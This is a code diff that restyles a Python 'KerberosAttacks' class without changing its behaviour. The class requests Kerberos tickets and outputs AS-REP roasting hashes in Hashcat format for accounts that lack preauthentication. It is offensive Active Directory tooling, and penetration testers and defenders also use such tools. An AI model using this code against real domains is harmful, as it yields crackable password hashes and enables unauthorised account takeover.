@@ -31,7 +31,7 @@ class KerberosAttacks:
                 self.lmhash, self.nthash = self.hash.split(':')
             else:
                 self.nthash = self.hash
-        
+
         if self.password is None:
             self.password = ''
 
@@ -87,12 +87,9 @@ class KerberosAttacks:
             pass
         else:
             # retrieve user and domain information from CCache file if needed
-            if self.domain == '':
-                domain = ccache.principal.realm['data']
-            else:
-                domain = self.domain
-            logging.debug("Using Kerberos Cache: %s" % getenv('KRB5CCNAME'))
-            principal = 'krbtgt/%s@%s' % (domain.upper(), domain.upper())
+            domain = ccache.principal.realm['data'] if self.domain == '' else self.domain
+            logging.debug(f"Using Kerberos Cache: {getenv('KRB5CCNAME')}")
+            principal = f'krbtgt/{domain.upper()}@{domain.upper()}'
             creds = ccache.getCredential(principal)
             if creds is not None:
                 TGT = creds.toTGT()
@@ -115,7 +112,7 @@ class KerberosAttacks:
                                                                 compute_nthash(self.password), self.aesKey,
                                                                 kdcHost=self.kdcHost)
             except Exception as e:
-                logging.debug('TGT: %s' % str(e))
+                logging.debug(f'TGT: {str(e)}')
                 tgt, cipher, oldSessionKey, sessionKey = getKerberosTGT(userName, self.password, self.domain,
                                                                     unhexlify(self.lmhash),
                                                                     unhexlify(self.nthash), self.aesKey,
@@ -140,7 +137,10 @@ class KerberosAttacks:
         asReq = AS_REQ()
 
         domain = self.domain.upper()
-        serverName = Principal('krbtgt/%s' % domain, type=constants.PrincipalNameType.NT_PRINCIPAL.value)
+        serverName = Principal(
+            f'krbtgt/{domain}', type=constants.PrincipalNameType.NT_PRINCIPAL.value
+        )
+
 
         pacRequest = KERB_PA_PAC_REQUEST()
         pacRequest['include-pac'] = requestPAC
@@ -156,10 +156,12 @@ class KerberosAttacks:
 
         reqBody = seq_set(asReq, 'req-body')
 
-        opts = list()
-        opts.append(constants.KDCOptions.forwardable.value)
-        opts.append(constants.KDCOptions.renewable.value)
-        opts.append(constants.KDCOptions.proxiable.value)
+        opts = [
+            constants.KDCOptions.forwardable.value,
+            constants.KDCOptions.renewable.value,
+            constants.KDCOptions.proxiable.value,
+        ]
+
         reqBody['kdc-options'] = constants.encodeFlags(opts)
 
         seq_set(reqBody, 'sname', serverName.components_to_asn1)
@@ -207,8 +209,10 @@ class KerberosAttacks:
             logging.debug('User %s doesn\'t have UF_DONT_REQUIRE_PREAUTH set' % userName)
             return
 
-        # Let's output the TGT enc-part/cipher in Hashcat format, in case somebody wants to use it.
-        hash_TGT =  '$krb5asrep$%d$%s@%s:%s$%s' % ( asRep['enc-part']['etype'], clientName, domain,
-                                                hexlify(asRep['enc-part']['cipher'].asOctets()[:16]).decode(),
-                                                hexlify(asRep['enc-part']['cipher'].asOctets()[16:]).decode())
-        return hash_TGT
+        return '$krb5asrep$%d$%s@%s:%s$%s' % (
+            asRep['enc-part']['etype'],
+            clientName,
+            domain,
+            hexlify(asRep['enc-part']['cipher'].asOctets()[:16]).decode(),
+            hexlify(asRep['enc-part']['cipher'].asOctets()[16:]).decode(),
+        )
